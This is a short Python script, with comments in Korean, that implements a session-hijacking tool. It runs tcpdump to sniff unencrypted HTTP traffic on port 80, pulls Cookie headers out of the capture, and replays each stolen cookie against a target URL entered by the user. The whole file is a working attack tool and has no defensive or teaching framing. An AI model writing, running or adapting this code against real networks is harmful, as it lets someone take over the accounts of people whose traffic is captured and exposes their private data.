#!/usr/bin/env python3
import requests
import subprocess
import re

class SessionHijacker:
    def __init__(self):
        self.captured_sessions = []
        
    def capture_session_from_tcpdump(self, interface="eth0", duration=30):
        """tcpdump를 사용해 세션 쿠키 캡처"""
        print(f"[*] Capturing traffic for {duration} seconds...")
        
        cmd = f"sudo timeout {duration} tcpdump -i {interface} -A -s 0 'tcp port 80'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 쿠키 추출
        cookies = re.findall(r'Cookie: (.+)', result.stdout)
        for cookie in cookies:
            self.captured_sessions.append(cookie.strip())
            
        return self.captured_sessions
    
    def replay_session(self, target_url, cookie_string):
        """캡처한 세션으로 요청 재생"""
        headers = {
            'Cookie': cookie_string,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
        
        try:
            response = requests.get(target_url, headers=headers)
            print(f"[+] Session replay status: {response.status_code}")
            return response
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

# 사용 예시
if __name__ == "__main__":
    hijacker = SessionHijacker()
    sessions = hijacker.capture_session_from_tcpdump(duration=10)
    
    if sessions:
        print(f"[+] Captured {len(sessions)} sessions")
        target = input("Target URL to test: ")
        
        for session in sessions:
            print(f"\n[*] Testing session: {session[:50]}...")
            hijacker.replay_session(target, session)